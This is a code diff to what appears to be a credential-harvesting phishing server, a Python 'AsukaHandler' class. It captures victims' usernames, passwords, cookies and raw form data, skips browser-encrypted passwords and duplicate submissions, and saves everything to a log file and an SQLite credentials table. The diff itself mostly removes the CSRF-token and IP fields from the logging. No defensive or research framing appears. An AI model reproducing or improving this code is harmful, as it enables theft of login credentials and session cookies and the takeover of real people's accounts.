@@ -39,13 +39,13 @@ def configure_logging(show_logs):
         console_handler = logging.StreamHandler()
         console_handler.setLevel(logging.DEBUG)
         handlers.append(console_handler)
-    
+
     logging.basicConfig(
         level=logging.DEBUG,
         format='%(asctime)s - %(levelname)s - %(message)s',
         handlers=handlers
     )
-    
+
     logging.getLogger().addFilter(No404Errors())
 
 # Load Fernet key
@@ -251,13 +251,12 @@ class AsukaHandler(BaseHTTPRequestHandler):
 
                 username = username or "N/A"
                 password = password or "N/A"
-                csrf_token = csrf_token or "N/A"
                 cookies = self.headers.get('Cookie', '') or "N/A"
                 ip = self.client_address[0]
 
                 current_time = datetime.now().timestamp()
                 submission_key = (ip, username)
-                
+
                 # Skip if password is encrypted or duplicate submission
                 if password.startswith('#PWD_BROWSER') or (submission_key in recent_submissions and current_time - recent_submissions[submission_key] < 1):
                     logging.debug(f"Skipping submission: encrypted={password.startswith('#PWD_BROWSER')}, duplicate={submission_key in recent_submissions}, username={username}, ip={ip}, requestId={request_id}")
@@ -276,10 +275,8 @@ class AsukaHandler(BaseHTTPRequestHandler):
                 print(f"\033[32m[+] Timestamp: {datetime.now().isoformat()}\033[0m")
                 print(f"\033[32m[+] Username: {username}\033[0m")
                 print(f"\033[32m[+] Password: {password}\033[0m")
-                print(f"\033[32m[+] IP Address: {ip}\033[0m")
                 print(f"\033[32m[+] User-Agent: {self.headers.get('User-Agent', 'N/A')}\033[0m")
                 print(f"\033[32m[+] Cookies: {cookies}\033[0m")
-                print(f"\033[32m[+] CSRF Token: {csrf_token}\033[0m")
                 print(f"\033[32m[+] Raw Data: {raw_data}\033[0m")
                 print(f"\033[32m[+] Request ID: {request_id}\033[0m")
 
@@ -288,24 +285,22 @@ class AsukaHandler(BaseHTTPRequestHandler):
                     f"[+] Timestamp: {datetime.now().isoformat()}\n"
                     f"[+] Username: {username}\n"
                     f"[+] Password: {password}\n"
-                    f"[+] IP Address: {ip}\n"
                     f"[+] User-Agent: {self.headers.get('User-Agent', 'N/A')}\n"
                     f"[+] Cookies: {cookies}\n"
-                    f"[+] CSRF Token: {csrf_token}\n"
                     f"[+] Raw Data: {raw_data}\n"
                     f"[+] Request ID: {request_id}"
                 )
                 logging.info(credential_message)
 
                 with open('credentials.log', 'a', encoding='utf-8') as f:
-                    f.write(f"[{datetime.now().isoformat()}] Username: {username}, Password: {password}, IP: {ip}, User-Agent: {self.headers.get('User-Agent', 'N/A')}, Cookies: {cookies}, CSRF: {csrf_token}, Raw: {raw_data}, RequestId: {request_id}\n")
+                    f.write(f"[{datetime.now().isoformat()}] Username: {username}, Password: {password}, User-Agent: {self.headers.get('User-Agent', 'N/A')}, Cookies: {cookies}, Raw: {raw_data}, RequestId: {request_id}\n")
 
                 try:
                     conn = sqlite3.connect('asuka_data.db', timeout=10)
                     c = conn.cursor()
-                    c.execute('''INSERT INTO CREDENTIALS (timestamp, username, password, ip, user_agent, cookies, raw_data, csrf_token)
-                                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
-                              (datetime.now().isoformat(), username, password, ip, self.headers.get('User-Agent', 'N/A'), cookies, raw_data, csrf_token))
+                    c.execute('''INSERT INTO CREDENTIALS (timestamp, username, password, ip, user_agent, cookies, raw_data)
+                                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                              (datetime.now().isoformat(), username, password, ip, self.headers.get('User-Agent', 'N/A'), cookies, raw_data))
                     conn.commit()
                     logging.info(f"Credentials saved: {username}, {ip}, requestId={request_id}")
                 except sqlite3.Error as e:
